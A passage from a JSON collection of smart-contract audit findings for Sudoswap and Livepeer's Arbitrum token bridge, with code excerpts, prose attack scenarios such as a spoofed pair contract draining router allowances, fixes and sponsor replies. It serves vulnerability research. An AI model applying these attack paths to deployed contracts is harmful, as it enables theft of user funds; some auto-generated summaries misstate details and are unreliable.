      "content": "## Severity: Critical Risk\n\n## Context\n- **LSSVMPairCloner.sol:** lines 121 \n- **LSSVMPair.sol:** lines 687-695 \n- **LSSVMRoute.sol:** lines 574-594 \n- **LSSVMPairFactory.sol:** lines 223-257 \n- **LSSVMPairCloner.sol:** lines 206\n\n## Description\nSpearbit discovered that the functions verifying if a contract is a pair do so by only checking the first 54 bytes (i.e., the Proxy code). An attacker could deploy a contract that starts with the first 54 bytes of proxy code but have a malicious payload, and these functions will still verify it as a legitimate clone. We have found this to be a critical issue based on the feasibility of a potential exploit.\n\n### Consider the following scenario:\n1. An attacker creates a malicious pair by making a copy of the source of `cloneETHPair()`, supplying malicious values for `factory`, `bondingCurve`, `nft`, and `poolType` using a valid template for the connected contract.\n2. The attacker has a contract with valid proxy code, connected to a valid template, but the rest of the parameters are invalid.\n3. The Pair is initialized via a copy of `initialize()` of `LSSVMPair`, which calls `__Ownable_init()` to set a malicious owner.\n4. The malicious owner calls `call()`, with target equal to the router contract and the calldata for the function `pairTransferERC20From()`:\n   ```solidity\n   // Owner is set by pair creator\n   function call(address payable target, bytes calldata data) external onlyOwner { \n       // Factory is malicious\n       LSSVMPairFactoryLike _factory = factory();\n       ///grave.ts1callAllowed() /grave.ts1is malicious and returns true\n       require(_factory.callAllowed(target), \"Target must be whitelisted\");\n       (bool result, ) = target.call{value: 0}(data);\n       require(result, \"Call failed\");\n   }\n   ```\n5. The check for `onlyOwner` and `require` pass, therefore `pairTransferERC20From()` is called with the malicious Pair as `msg.sender`.\n6. The router checks if it is called from a valid pair via `isPair()`:\n   ```solidity\n   function pairTransferERC20From(...) external {\n       // Verify caller is a trusted pair contract\n       // The malicious pair passed this test\n       require(factory.isPair(msg.sender, variant), \"Not pair\");\n       ...\n       token.safeTransferFrom(from, to, amount);\n   }\n   ```\n7. Because the function `isPair()` only checks the first 54 bytes (the runtime code including the implementation address), `isPair()` does not check for extra parameters `factory`, `bondingCurve`, `nft`, or `poolType`:\n   ```solidity\n   function isPair(address potentialPair, PairVariant variant) ... {\n       ...\n   } else if (variant == PairVariant.ENUMERABLE_ETH) {\n       return LSSVMPairCloner.isETHPairClone(address(enumerableETHTemplate), potentialPair);\n   }\n   ...\n   function isETHPairClone(address implementation, address query) ... {\n       ...\n       // Compare expected bytecode with that of the queried contract\n       let other := add(ptr, 0x40)\n       extcodecopy(query, other, 0, 0x36)\n       result := and(\n           eq(mload(ptr), mload(other)),\n           // Checks 32 + 22 = 54 bytes\n           eq(mload(add(ptr, 0x16)), mload(add(other, 0x16)))\n       )\n   }\n   ```\n8. Now the malicious pair is considered valid, the require statement in `pairTransferERC20From()` has passed, and tokens can be transferred to the attacker from anyone who has set an allowance for the router.\n\n## Recommendation\nSpearbit recommends Sudoswap to verify more values when checking if a pair is valid—especially the factory value. We also recommend considering the removal of all trust between pairs and routers, as well as the function `call()`.\n\n### Sudoswap\nAdded factory check to `isPair` functions here.\n\n### Spearbit\nAcknowledged. Please double-check with the changes for the finding \"Saving 1 byte Off The Constructor() Code\"—especially the amount of bytes checked at the end of `isETHPairClone()` and `isERC20PairClone()`.",
      "summary": "\nThis bug report describes a critical security risk in the LSSVMPairCloner.sol, LSSVMPair.sol, LSSVMRouter.sol, LSSVMPairFactory.sol and LSSVMPairCloner.sol contracts. The issue is that these contracts only check the first 54 bytes (i.e. the Proxy code) when verifying if a contract is a pair. This means that an attacker could deploy a contract that starts with the first 54 bytes of proxy code but have a malicious payload and these functions will still verify it as a legitimate clone. \n\nThis could be exploited in the following way: an attacker creates a malicious pair by making a copy of the source of cloneETHPair() supplying malicious values for factory, bondingCurve, nft and poolType using a valid template for the connected contract. The attacker then has a contract with valid proxy code, connected to a valid template, but the rest of the parameters are invalid. This malicious owner then calls call() with target equal to the router contract and the calldata for the function pairTransferERC20From(). The check for onlyOwner and require pass, therefore pairTransferERC20From() is called with the malicious Pair as msg.sender. Because the function isPair() only checks the first 54 bytes, it does not check for extra parameters factory, bondingCurve, nft or poolType, and so the malicious pair is considered valid. The require statement in pairTransferERC20From() has passed and tokens can be transferred to the attacker from anyone who has set an allowance for the router. \n\nSpearbit recommends Sudoswap to verify more values when checking if a pair is valid - especially the factory value. They also recommend to consider the removal of all trust between pairs and routers, as well as the function call(). Sudoswap has added a factory check to the isPair functions, and Spearbit has acknowledged this. They also recommend to double-check with the changes for the finding “Saving 1 byte Off The Constructor() Code” - especially the amount of bytes checked at the end of isETHPairClone() and isERC20PairClone().",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Max Goodman",
        "Mudit Gupta",
        "Gerard Persoon"
      ]
    },
    {
      "id": "25630",
      "title": "[M-08] Admin can rug L2 Escrow tokens leading to reputation risk",
      "impact": "MEDIUM",
      "content": "_Submitted by harleythedog_.\n\nThe `L1Escrow` contract has the function `approve` that is callable by the admin to approve an arbitrary spender with an arbitrary amount (so they can steal all of the escrow's holdings if they want). Even if the admin is well intended, the contract can still be called out which would degrade the reputation of the protocol (e.g. see here: <https://twitter.com/RugDocIO/status/1411732108029181960>). LPT is valuable on the Ethereum mainnet, so this rug vector should be mitigated. It would be best to restrict this function's power by only allowing approvals to other trusted protocol contracts (like L1LPTGateway, which I believe uses the escrow's approval).\n\nNOTE: Even if the admin is under a timelock, this is still an issue, as users have to wait a whole week to withdraw from L2 -> L1 due to the dispute period.\n\n#### Proof of Concept\n\nSee the `approve` function [here](https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/escrow/L1Escrow.sol#L21)\n\n#### Recommended Mitigation Steps\n\nRestrict the power of this `approve` function so that the admin isn't able to steal funds. This can be accomplished by only allowing approvals to other protocol functions (instead of arbitrary approvals).\n\n**[yondonfu (Livepeer) acknowledged](https://github.com/code-423n4/2022-01-livepeer-findings/issues/165)** \n\n",
      "summary": "\nThis bug report is about the `L1Escrow` contract which has a function `approve` that can be called by the admin to approve a spender with an arbitrary amount. This could lead to the admin stealing all of the escrow's holdings. This is a serious issue as LPT is valuable on the Ethereum mainnet and the reputation of the protocol could be degraded. The bug report also notes that even if the admin is under a timelock, this is still an issue as users have to wait a whole week to withdraw from L2 -> L1 due to the dispute period.\n\nThe bug report provides a link to the `approve` function and the recommended mitigation step is to restrict the power of this `approve` function so that the admin isn't able to steal funds. This can be accomplished by only allowing approvals to other protocol functions (instead of arbitrary approvals). The bug report also acknowledges that Livepeer (yondonfu) is aware of this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Livepeer",
      "source_link": "https://code4rena.com/reports/2022-01-livepeer",
      "github_link": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/165",
      "tags": [],
      "finders": []
    },
    {
      "id": "25629",
      "title": "[M-07] [WP-M4] Unable to use `L2GatewayRouter` to withdraw LPT from L2 to L1, as `L2LPTGateway` does not implement `L2GatewayRouter` expected method",
      "impact": "MEDIUM",
      "content": "_Submitted by WatchPug_.\n\nPer the document: <https://github.com/code-423n4/2022-01-livepeer#l2---l1-lpt-withdrawal>\n\n> The following occurs when LPT is withdrawn from L2 to L1:\n\n> The user initiates a withdrawal for X LPT. This can be done in two ways: a. Call outboundTransfer() on L2GatewayRouter which will call outboundTransfer() on L2LPTGateway b. Call outboundTransfer() directly on L2LPTGateway\n\nThe method (a) described above won't work in the current implementation due to the missing interface on `L2LPTGateway`.\n\nWhen initiate a withdraw from the Arbitrum Gateway Router, `L2GatewayRouter` will call `outboundTransfer(address,address,uint256,uint256,uint256,bytes)` on `ITokenGateway(gateway)`:\n\n```solidity\nfunction outboundTransfer(\n    address _token,\n    address _to,\n    uint256 _amount,\n    uint256 _maxGas,\n    uint256 _gasPriceBid,\n    bytes calldata _data\n) external payable returns (bytes memory);\n```\n\n<https://github.com/OffchainLabs/arbitrum/blob/b8366005a697000dda1f57a78a7bdb2313db8fe2/packages/arb-bridge-peripherals/contracts/tokenbridge/arbitrum/gateway/L2GatewayRouter.sol#L57-L64>\n\n```solidity\nfunction outboundTransfer(\n    address _l1Token,\n    address _to,\n    uint256 _amount,\n    bytes calldata _data\n) public payable returns (bytes memory) {\n    return outboundTransfer(_l1Token, _to, _amount, 0, 0, _data);\n}\n```\n\n<https://github.com/OffchainLabs/arbitrum/blob/b8366005a697000dda1f57a78a7bdb2313db8fe2/packages/arb-bridge-peripherals/contracts/tokenbridge/libraries/gateway/GatewayRouter.sol#L78-L102>\n\n```solidity\nfunction outboundTransfer(\n    address _token,\n    address _to,\n    uint256 _amount,\n    uint256 _maxGas,\n    uint256 _gasPriceBid,\n    bytes calldata _data\n) public payable virtual override returns (bytes memory) {\n    address gateway = getGateway(_token);\n    bytes memory gatewayData = GatewayMessageHandler.encodeFromRouterToGateway(\n        msg.sender,\n        _data\n    );\n\n    emit TransferRouted(_token, msg.sender, _to, gateway);\n    return\n        ITokenGateway(gateway).outboundTransfer{ value: msg.value }(\n            _token,\n            _to,\n            _amount,\n            _maxGas,\n            _gasPriceBid,\n            gatewayData\n        );\n}\n```\n\nHowever, `L2LPTGateway` dose not implement `outboundTransfer(address,address,uint256,uint256,uint256,bytes)` but only `outboundTransfer(address,address,uint256,bytes)`:\n\n<https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/gateway/L2LPTGateway.sol#L65-L89>\n\n```solidity\nfunction outboundTransfer(\n    address _l1Token,\n    address _to,\n    uint256 _amount,\n    bytes calldata _data\n) public override whenNotPaused returns (bytes memory res) {\n    // ...\n}\n```\n\nTherefore, the desired feature to withdraw LPT from L2 to L1 via Arbitrum Router will not be working properly.\n\n#### Recommendation\n\nConsider implementing the method used by  Arbitrum Router.\n\nSee also the implementation of L2DaiGateway by arbitrum-dai-bridge: <https://github.com/makerdao/arbitrum-dai-bridge/blob/master/contracts/l2/L2DaiGateway.sol#L88-L95>\n\n**[yondonfu (Livepeer) confirmed and resolved](https://github.com/code-423n4/2022-01-livepeer-findings/issues/202#issuecomment-1026222951):**\n > Fixed in https://github.com/livepeer/arbitrum-lpt-bridge/pull/57\n\n\n\n",
      "summary": "\nA bug report was submitted, describing an issue with withdrawing LPT from L2 to L1 via Arbitrum Router. The bug occurs because the method (a) described in the document does not work in the current implementation due to the missing interface on `L2LPTGateway`. This is because `L2LPTGateway` does not implement `outboundTransfer(address,address,uint256,uint256,uint256,bytes)` but only `outboundTransfer(address,address,uint256,bytes)`. The recommendation was to consider implementing the method used by Arbitrum Router, as seen in the implementation of L2DaiGateway by arbitrum-dai-bridge. The bug was confirmed and resolved by yondonfu (Livepeer) in a pull request on Github.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Livepeer",
      "source_link": "https://code4rena.com/reports/2022-01-livepeer",
      "github_link": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/202",
      "tags": [],
      "finders": []
    },
    {
      "id": "25628",
      "title": "[M-06] [WP-M2] `DEFAULT_ADMIN_ROLE` can approve arbitrary address to spend any amount from the `L1Escrow` contract",
      "impact": "MEDIUM",
      "content": "_Submitted by WatchPug_.\n\n<https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/escrow/L1Escrow.sol#L21-L28>\n\n```solidity\nfunction approve(\n    address _token,\n    address _spender,\n    uint256 _value\n) public onlyRole(DEFAULT_ADMIN_ROLE) {\n    ApproveLike(_token).approve(_spender, _value);\n    emit Approve(_token, _spender, _value);\n}\n```\n\n`L1Escrow.sol#approve()` allows an address with `DEFAULT_ADMIN_ROLE` can approve an arbitrary amount of tokens to any address.\n\nWe believe this is unnecessary and poses a serious centralization risk.\n\nA malicious or compromised `DEFAULT_ADMIN_ROLE` address can take advantage of this, and steal all the funds from the `L1Escrow` contract.\n\n#### Recommendation\n\nConsider removing `approve()` function and approve `l1LPT` to `l1Gateway` in the constructor.\n\n**[yondonfu (Livepeer) acknowledged](https://github.com/code-423n4/2022-01-livepeer-findings/issues/195#issuecomment-1019662710):**\n > Likely won't change as we want to preserve the ability for protocol governance to move the LPT from the L1Escrow in the event of a L2 failure.\n\n\n\n",
      "summary": "\nA bug report submitted by WatchPug on the Github page of Arbitrum-LPT-Bridge revealed that the L1Escrow.sol#approve() function allows an address with the DEFAULT_ADMIN_ROLE to approve an arbitrary amount of tokens to any address. This poses a serious centralization risk, as a malicious or compromised DEFAULT_ADMIN_ROLE address can take advantage of this and steal all the funds from the L1Escrow contract. \n\nIt was recommended that the approve() function be removed and that the l1LPT be approved to l1Gateway in the constructor. However, Yondonfu (Livepeer) acknowledged that this likely won't change as they want to preserve the ability for protocol governance to move the LPT from the L1Escrow in the event of a L2 failure.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Livepeer",
      "source_link": "https://code4rena.com/reports/2022-01-livepeer",
      "github_link": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/195",
      "tags": [],
      "finders": []
    },
    {
      "id": "25627",
      "title": "[M-05] [WP-M1] `BURNER_ROLE` can burn any amount of L2LivepeerToken from an arbitrary address",
      "impact": "MEDIUM",
      "content": "_Submitted by WatchPug, also found by cccz_.\n\n<https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/token/LivepeerToken.sol#L36-L43>\n\n```solidity\nfunction burn(address _from, uint256 _amount)\n    external\n    override\n    onlyRole(BURNER_ROLE)\n{\n    _burn(_from, _amount);\n    emit Burn(_from, _amount);\n}\n```\n\nUsing the `burn()` function of `L2LivepeerToken`, an address with `BURNER_ROLE` can burn an arbitrary amount of tokens from any address.\n\nWe believe this is unnecessary and poses a serious centralization risk.\n\nA malicious or compromised `BURNER_ROLE` address can take advantage of this, burn the balance of a Uniswap pool and effectively steal almost all the funds from the liquidity pool (eg, Uniswap LPT-WETH Pool).\n\n#### Recommendation\n\nConsider removing the `BURNER_ROLE` and change `burn()` function to:\n\n```solidity\nfunction burn(uint256 _amount)\n    external\n    override\n{\n    _burn(msg.sender, _amount);\n    emit Burn(msg.sender, _amount);\n}\n```\n\n<https://github.com/livepeer/arbitrum-lpt-bridge/blob/49cf5401b0514511675d781a1e29d6b0325cfe88/contracts/L2/gateway/L2LPTGateway.sol#L34-L45>\n\n`Mintable(l2Lpt).burn(from, _amount);` in `L2LPTGateway.sol#outboundTransfer()` should also be replaced with:\n\n```solidity\nMintable(l2Lpt).transferFrom(from, _amount);\nMintable(l2Lpt).burn(_amount);\n```\n\n**[yondonfu (Livepeer) confirmed and resolved](https://github.com/code-423n4/2022-01-livepeer-findings/issues/194#issuecomment-1021377760):**\n > Fixed in https://github.com/livepeer/arbitrum-lpt-bridge/pull/52\n\n\n\n",
      "summary": "\nA bug was found in the `L2LivepeerToken` contract, which allows a malicious or compromised address with the `BURNER_ROLE` to burn an arbitrary amount of tokens from any address. This poses a serious centralization risk, as a malicious actor could take advantage of this to steal funds from liquidity pools such as Uniswap's LPT-WETH pool. The `BURNER_ROLE` should be removed and the `burn()` function should be changed so that only the sender can burn their own tokens. Additionally, the `Mintable(l2Lpt).burn(from, _amount);` in `L2LPTGateway.sol#outboundTransfer()` should be replaced with `Mintable(l2Lpt).transferFrom(from, _amount);` and `Mintable(l2Lpt).burn(_amount);`. The bug has since been confirmed and resolved.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Livepeer",
      "source_link": "https://code4rena.com/reports/2022-01-livepeer",
      "github_link": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/194",
      "tags": [],
      "finders": []
    },
    {
      "id": "25626",
      "title": "[M-04] [WP-M0] `MINTER_ROLE` can be granted by the deployer of L2LivepeerToken and mint arbitrary amount of tokens",
      "impact": "MEDIUM",
      "content": "_Submitted by WatchPug_.\n\n<https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/token/LivepeerToken.sol#L23-L30>\n\n```solidity\nfunction mint(address _to, uint256 _amount)\n    external\n    override\n    onlyRole(MINTER_ROLE)\n{\n    _mint(_to, _amount);\n    emit Mint(_to, _amount);\n}\n```\n\nUsing the `mint()` function of `L2LivepeerToken`, an address with `MINTER_ROLE` can burn an arbitrary amount of tokens.\n\nIf the private key of the deployer or an address with the `MINTER_ROLE` is compromised, the attacker will be able to mint an unlimited amount of LPT tokens.\n\nWe believe this is unnecessary and poses a serious centralization risk.\n\n#### Recommendation\n\nConsider removing the `MINTER_ROLE`, make the `L2LivepeerToken` only mintable by the owner, and make the L2Minter contract to be the owner and therefore the only minter.\n\n**[yondonfu (Livepeer) acknowledged](https://github.com/code-423n4/2022-01-livepeer-findings/issues/193#issuecomment-1019660423):**\n > Planning on keeping the role since the L2LPTGateway needs to be given minting rights as well in addition to the L2 Minter.\n\n\n\n",
      "summary": "\nThis bug report is about the `L2LivepeerToken` contract which has a `mint()` function that allows an address with `MINTER_ROLE` to burn an arbitrary amount of tokens. This poses a serious centralization risk as if the private key of the deployer or an address with the `MINTER_ROLE` is compromised, the attacker will be able to mint an unlimited amount of LPT tokens.\n\nThe recommendation is to remove the `MINTER_ROLE` and make the `L2LivepeerToken` only mintable by the owner. The owner should be the `L2Minter` contract. However, the recommendation was acknowledged by Yondonfu (Livepeer) who said they are planning on keeping the role since the `L2LPTGateway` needs to be given minting rights as well in addition to the `L2Minter`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Livepeer",
      "source_link": "https://code4rena.com/reports/2022-01-livepeer",
      "github_link": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/193",
      "tags": [],
      "finders": []
    },
    {
      "id": "25625",
      "title": "[M-03] Fund loss when insufficient call value to cover fee",
      "impact": "MEDIUM",
      "content": "_Submitted by gzeon_.\n\nFund can be lost if the L1 call value provided is insufficient to cover `_maxSubmissionCost`, or stuck if insufficient to cover `_maxSubmissionCost + (_maxGas * _gasPriceBid)`.\n\n#### Proof of Concept\n\n`outboundTransfer` in `L1LPTGateway` does not check if the call value is sufficient, if it is `< _maxSubmissionCost` the retryable ticket creation will fail and fund is lost; if it is `<_maxSubmissionCost + (_maxGas * _gasPriceBid)` the ticket would require manual execution.\n\n<https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1LPTGateway.sol#L80>\n```solidity\nfunction outboundTransfer(\n    address _l1Token,\n    address _to,\n    uint256 _amount,\n    uint256 _maxGas,\n    uint256 _gasPriceBid,\n    bytes calldata _data\n) external payable override whenNotPaused returns (bytes memory) {\n    require(_l1Token == l1Lpt, \"TOKEN_NOT_LPT\");\n\n    // nested scope to avoid stack too deep errors\n    address from;\n    uint256 seqNum;\n    bytes memory extraData;\n    {\n        uint256 maxSubmissionCost;\n        (from, maxSubmissionCost, extraData) = parseOutboundData(_data);\n        require(extraData.length == 0, \"CALL_HOOK_DATA_NOT_ALLOWED\");\n\n        // transfer tokens to escrow\n        TokenLike(_l1Token).transferFrom(from, l1LPTEscrow, _amount);\n\n        bytes memory outboundCalldata = getOutboundCalldata(\n            _l1Token,\n            from,\n            _to,\n            _amount,\n            extraData\n        );\n\n        seqNum = sendTxToL2(\n            l2Counterpart,\n            from,\n            maxSubmissionCost,\n            _maxGas,\n            _gasPriceBid,\n            outboundCalldata\n        );\n    }\n\n    emit DepositInitiated(_l1Token, from, _to, seqNum, _amount);\n\n    return abi.encode(seqNum);\n}\n```\n#### Recommended Mitigation Steps\n\nAdd check similar to the one used in `L1GatewayRouter` provided by Arbitrum team\n\n<https://github.com/OffchainLabs/arbitrum/blob/b8366005a697000dda1f57a78a7bdb2313db8fe2/packages/arb-bridge-peripherals/contracts/tokenbridge/ethereum/gateway/L1GatewayRouter.sol#L236>\n```solidity\nuint256 expectedEth = _maxSubmissionCost + (_maxGas * _gasPriceBid);\nrequire(_maxSubmissionCost > 0, \"NO_SUBMISSION_COST\");\nrequire(msg.value == expectedEth, \"WRONG_ETH_VALUE\");\n```\n\n**[yondonfu (Livepeer) confirmed and disagreed with severity](https://github.com/code-423n4/2022-01-livepeer-findings/issues/238#issuecomment-1018693125):**\n > Labeled as disagree with severity because we think this is a 2 - Med finding. We think that the likelihood of this occurring is low because in almost all cases users should be interacting with this contract using an application that handles calculating the maxSubmissionCost properly which would prevent the reported issue. However, we do think that the impact *if* this occurs is high since LPT *and* ETH could be lost if the reported issue happens. Thus, we think 2 - Med is appropriate given that assets are not at direct risk, but there is a low probability path for assets to be lost.\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-01-livepeer-findings/issues/238#issuecomment-1025009724):**\n > I agree, there is potential for unintentional loss of funds, however, the attack vector makes assumptions on how this might occur. Due to the unlikely nature, I agree that this should be a `medium` severity issue..\n\n**[yondonfu (Livepeer) resolved](https://github.com/code-423n4/2022-01-livepeer-findings/issues/238#issuecomment-1026220888):**\n > Fixed in https://github.com/livepeer/arbitrum-lpt-bridge/commit/6615bb8ce0fced895acd0e5d3e826c1e7b5d0138\n\n\n\n",
      "summary": "\nThis bug report was submitted by gzeon and is related to the `outboundTransfer` function in the `L1LPTGateway` smart contract. The issue is that the function does not check if the call value is sufficient. If it is less than `_maxSubmissionCost`, the retryable ticket creation will fail and the funds will be lost. On the other hand, if it is less than `_maxSubmissionCost + (_maxGas * _gasPriceBid)`, the ticket will require manual execution. \n\nLivepeer and the judge agreed that this issue should be classified as a medium severity issue due to the low probability of the issue occurring. Livepeer fixed the issue in a commit to the GitHub repository.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Livepeer",
      "source_link": "https://code4rena.com/reports/2022-01-livepeer",
      "github_link": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/238",
      "tags": [],
      "finders": []
    },
    {
      "id": "25624",
      "title": "[M-02] [WP-H3] `L1Migrator.sol#migrateETH()` Improper implementation of `L1Migrator` causing `migrateETH()` always reverts, can lead to ETH in `BridgeMinter` getting stuck in the contract",
      "impact": "MEDIUM",
      "content": "_Submitted by WatchPug, also found by gzeon_.\n\n<https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1Migrator.sol#L308-L310>\n\n```solidity\nuint256 amount = IBridgeMinter(bridgeMinterAddr).withdrawETHToL1Migrator();\n```\n\n`L1Migrator.sol#migrateETH()` will call `IBridgeMinter(bridgeMinterAddr).withdrawETHToL1Migrator()` to withdraw ETH from `BridgeMinter`.\n\nHowever, the current implementation of `L1Migrator` is unable to receive ETH.\n\n<https://github.com/livepeer/protocol/blob/20e7ebb86cdb4fe9285bf5fea02eb603e5d48805/contracts/token/BridgeMinter.sol#L94-L94>\n\n```solidity\n(bool ok, ) = l1MigratorAddr.call.value(address(this).balance)(\"\");\n```\n\nA contract receiving Ether must have at least one of the functions below:\n\n*   `receive() external payable`\n*   `fallback() external payable`\n\n`receive()` is called if `msg.data` is empty, otherwise `fallback()` is called.\n\nBecause `L1Migrator` implement neither `receive()` or `fallback()`, the `call` at L94 will always revert.\n\n#### Impact\n\nAll the ETH held by the `BridgeMinter` can get stuck in the contract.\n\n#### Recommendation\n\nAdd `receive() external payable {}` in `L1Migrator`.\n\n**[yondonfu (Livepeer) confirmed and disagreed with severity](https://github.com/code-423n4/2022-01-livepeer-findings/issues/198#issuecomment-1019663325):**\n > Severity: 2 (Med)\n> \n> We'll fix this, but noting that the funds are recoverable because the BridgeMinter can set a new L1Migrator that does have the receive() function which is why the suggested severity is 2 (Med).\n\n**[yondonfu (Livepeer) resolved](https://github.com/code-423n4/2022-01-livepeer-findings/issues/198#issuecomment-1021379439):**\n > Fixed in https://github.com/livepeer/arbitrum-lpt-bridge/pull/50\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-01-livepeer-findings/issues/198#issuecomment-1025009024):**\n > Agree with sponsor, these funds are recoverable. However, the warden has identified a DOS attack, which is a valid `medium` severity issue.\n\n\n\n",
      "summary": "\nA bug was identified in the code for the L1Migrator contract. The code calls the IBridgeMinter to withdraw ETH from the BridgeMinter but the current implementation of the L1Migrator is unable to receive ETH. The contract should have either a `receive() external payable` or `fallback() external payable` function in order to receive ETH, but neither is implemented. This means that all ETH held by the BridgeMinter can get stuck in the contract, which is a medium severity issue as it is a potential DOS attack. The bug has been fixed in a pull request and the funds are recoverable as the BridgeMinter can set a new L1Migrator that does have the receive() function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Livepeer",
      "source_link": "https://code4rena.com/reports/2022-01-livepeer",
      "github_link": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/198",
      "tags": [],
      "finders": []
    },
    {
      "id": "25623",
      "title": "[M-01] L1Migrator.migrateLPT` can be used to take away protocol's access to LPT tokens in BridgeMinter",
      "impact": "MEDIUM",
      "content": "_Submitted by Ruhum, also found by gzeon and harleythedog_.\n\nSame thing as the ETH issue I reported earlier. I wasn't sure if those are supposed to be a single issue or not. The concept is the same. But, now you lose LPT tokens.\n\nThe `L1Migrator.migrateLPT()` function can be called by **anyone**. It pulls all the LPT from the `BridgeMinter` contract and starts the process of moving the funds to L2. First of all, this function is only executable once. The RetryableTicket created with the first call is the only chance of moving the funds to L2.\n\nThe attacker can call the function with [parameters](https://developer.offchainlabs.com/docs/l1\\_l2\\_messages#parameters) that make the creation of the RetryableTicket on L2 fail. Thus, the LPT sits in the L1Migrator contract with no way of moving it to L2 or anywhere else. Effectively, the funds are lost.\n\n#### Proof of Concept\n\nThe function is only executable once because it uses the `amount` returned by `IBridgeMinter(bridgeMinterAddr).withdrawLPTToL1Migrator()` to specify the amount of LPT to be sent to L2: <https://github.com/livepeer/arbitrum-lpt-bridge/blob/main/contracts/L1/gateway/L1Migrator.sol#L342>\n\nAfter the first call to `migrateLPT()` that function will always return 0 since the `BridgeMinter` won't have any more LPT: <https://github.com/livepeer/protocol/blob/streamflow/contracts/token/BridgeMinter.sol#L107>\n\nSo after the attacker called `migrateLPT()` with insufficient funds to create a RetryableTicket on L2 we have the following state:\n\n*   BridgeMinter has 0 LPT\n*   L1Migrator has X amount of LPT that is not accessible. There are no functions to get the LPT out of there.\n*   1 failed RetryTicket\n\nThe same thing can also be triggered by a non-malicious caller by simply providing insufficient funds. The whole design of only being able to try once is the issue here.\n\n#### Recommended Mitigation Steps\n\nInstead of using the `amount` returned by `IBridgeMinter(bridgeMinterAddr).withdrawLPTToL1Migrator()` you should use the balance of the `L1Migrator` contract.\n\nIt might also make sense to **not** allow anybody to call the function. I don't see the benefit of that.\n\nActually, the funds aren't lost. The funds are sent to the Escrow contract which can be used to transfer the funds back to the BridgeMinter contract. Thus, you could reset the whole thing to its initial state and call `L1Migrator.migrateLPT()` again. But, a really persistent attacker has the ability to DoS the function by frontrunning any call to it which results in the RetryableTicket failing again. Thus, you'd have to transfer the funds from the Escrow contract to the BrigeMinter again and so on.\n\nSo the same scenario I've outlined earlier is still viable. It's just a bit more difficult now since it has a higher cost for the attacker now. Because of that I think it's an medium issue instead of high.\n\nAlso, the mitigation steps I've given aren't valid. You can't use the `L1Migrator` contract's balance since it will always be 0 (the funds are sent to the Escrow contract). Thus the best solution would be to just limit the access to the function.\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-01-livepeer-findings/issues/97#issuecomment-1025008823):**\n > Nice find! The warden has outlined a potential DOS attack which can lead to funds lost which are only recoverable by the transferring the funds in the escrow contract back to the bridge minter contract.\n\n**[yondonfu (Livepeer) confirmed and resolved](https://github.com/code-423n4/2022-01-livepeer-findings/issues/97#issuecomment-1026222409):**\n > Fixed in https://github.com/livepeer/arbitrum-lpt-bridge/commit/5b6a349ad8f4e53c01d2e43eda36bbbf3037a3c9\n\n\n\n",
      "summary": "\nA bug was reported in the ETH issue which caused users to lose their LPT tokens. The bug was caused by the `L1Migrator.migrateLPT()` function, which can be called by anyone, and the parameters used in the call can cause the creation of a RetryableTicket on L2 to fail. This leaves the funds in the L1Migrator contract with no way to be moved to L2 or anywhere else, effectively resulting in the funds being lost. \n\nThe bug was caused by the function using the `amount` returned by `IBridgeMinter(bridgeMinterAddr).withdrawLPTToL1Migrator()` to specify the amount of LPT to be sent to L2, which will always return 0 after the first call. The same thing can be triggered by a non-malicious caller by providing insufficient funds. \n\nThe recommended mitigation steps were to use the balance of the `L1Migrator` contract instead of the `amount` returned, or to limit access to the function. However, the funds aren't actually lost, as they can be transferred back to the BridgeMinter contract from the Escrow contract. This would reset the whole system and allow for the `L1Migrator.migrateLPT()` function to be called again. \n\nThe bug was confirmed and resolved by Livepeer, with a fix being committed to the GitHub repository.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Livepeer",
      "source_link": "https://code4rena.com/reports/2022-01-livepeer",
      "github_link": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/97",
      "tags": [],
      "finders": []
    },
    {
      "id": "25622",
      "title": "[H-01] [WP-H5] `L1Migrator.sol#migrateETH()` does not send `bridgeMinter`'s ETH to L2 causing ETH get frozen in the contract",
      "impact": "HIGH",
